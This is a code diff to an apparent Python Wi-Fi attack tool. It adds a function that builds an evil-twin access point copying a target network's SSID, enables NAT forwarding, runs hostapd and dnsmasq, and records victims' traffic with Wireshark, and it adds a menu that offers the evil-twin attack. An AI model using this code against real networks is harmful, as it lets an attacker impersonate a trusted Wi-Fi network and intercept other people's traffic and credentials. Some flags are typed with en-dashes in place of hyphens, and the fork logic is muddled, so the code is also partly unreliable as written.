@@ -70,6 +70,34 @@ def get_target(interface):
     print("\nYou chose : "+target[0])
     return target
 
+def evil_twix(interface, target):
+
+    # Allow forwarding and put interface in ip tables
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    os.system("iptables –I POSTROUTING –t nat –o %s -j MASQUERADE" % interface)
+    
+    # Copy the templates in the working directory
+    os.system("cp template/template_dnsmasq.conf dnsmasq.conf")
+    os.system("cp template/template_hostapd.conf hostapd.conf")
+
+    # Modifying the templates
+    os.system("sed -i 's/iface_to_use/%s/' dnsmasq.conf"% interface)
+    os.system("sed -i 's/iface_to_use/%s/' hostapd.conf"% interface)
+    os.system("sed -i 's/ssid_to_use/%s/' hostapd.conf"% target[0])
+
+    # Setting interface ip address
+    os.system("ip addr add 192.168.1.1/24 dev %s" % interface)
+
+    hostapd = os.fork()
+    dnsmasq = os.fork()
+
+    if hostapd:
+        os.system("hostapd hostapd.conf")
+    elif dnsmasq:
+        os.system("dnsmasq –d –C dnsmasq.conf")
+    else:
+        os.system("wireshark -i %s -w test.pcap" % interface)
+
 if __name__ == "__main__":
     
     # Check for root privileges
@@ -81,3 +109,7 @@ if __name__ == "__main__":
     os.system("cat banner/banner_%d.txt" % randint(0, 5))
     interface = get_interfaces()
     target = get_target(interface)
+    attacksAvailable = "(E)vil twin"
+    attack = input("Which attack do you want to perform : " + attacksAvailable)
+    if attack == "E" or attack == "e":
+        evil_twix(interface, target)
